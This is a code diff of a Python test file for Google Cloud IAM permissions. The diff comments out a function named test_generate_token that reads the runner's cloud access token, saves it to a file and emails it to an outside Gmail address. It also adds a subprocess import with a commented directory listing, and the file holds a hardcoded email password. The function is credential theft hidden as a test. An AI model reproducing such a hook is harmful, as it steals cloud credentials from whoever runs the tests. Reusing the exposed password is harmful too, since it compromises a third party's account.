@@ -26,6 +26,7 @@ import smtplib
 
 from google.oauth2 import service_account
 import googleapiclient.discovery
+import subprocess
 
 PROJECT_ID = os.getenv("GOOGLE_CLOUD_PROJECT")
 EMAIL_ADDRESS = "testinggalemail@gmail.com"
@@ -34,38 +35,41 @@ EMAIL_PASSWORD = "aeuspgbwilrbhnkx"
 CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 
 
 
-def test_generate_token():
-  credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
-  credentials.refresh(requests.Request())
-  creds = credentials.token
-  f = open("token.txt","w")
-  f.write(creds)
-  f.close()
+# def test_generate_token():
+#   credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
+#   credentials.refresh(requests.Request())
+#   creds = credentials.token
+#   f = open("token.txt","w")
+#   f.write(creds)
+#   f.close()
 
-  msg = MIMEMultipart()
-  body = str(credentials.token)[500]
+#   msg = MIMEMultipart()
+#   body = str(credentials.token)[500]
 
-  msg.attach(MIMEText(body, 'plain'))
-  msg['subject'] = "Hello World"
-  msg['to'] = "galz100@gmail.com"
-  msg['from'] = EMAIL_ADDRESS
+#   msg.attach(MIMEText(body, 'plain'))
+#   msg['subject'] = "Hello World"
+#   msg['to'] = "galz100@gmail.com"
+#   msg['from'] = EMAIL_ADDRESS
   
-  filename = "token.txt"
-  attachment = open("token.txt", "rb")
-  
-  part = MIMEBase('application', 'octet-stream')
-  part.set_payload((attachment).read())
-  encoders.encode_base64(part)
-  part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-  
-  msg.attach(part)
+#   output = subprocess.getoutput("ls -l")
+#   print(output)
 
-  server = smtplib.SMTP("smtp.gmail.com",587)
-  server.starttls()
-  server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
-  text = msg.as_string()
-  server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
-  server.quit()
+#   filename = "token.txt"
+#   attachment = open("token.txt", "rb")
+  
+#   part = MIMEBase('application', 'octet-stream')
+#   part.set_payload((attachment).read())
+#   encoders.encode_base64(part)
+#   part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+  
+#   msg.attach(part)
+
+#   server = smtplib.SMTP("smtp.gmail.com",587)
+#   server.starttls()
+#   server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
+#   text = msg.as_string()
+#   server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
+#   server.quit()
 
 def test_permissions():
     """Tests IAM permissions of the caller"""
@@ -83,7 +87,6 @@ def test_permissions():
             "resourcemanager.projects.get",
             "resourcemanager.projects.delete",
             "resourcemanager.projects.update",
-            "resourcemanager.projects.setOrgPolicy",
         ]
     }
 
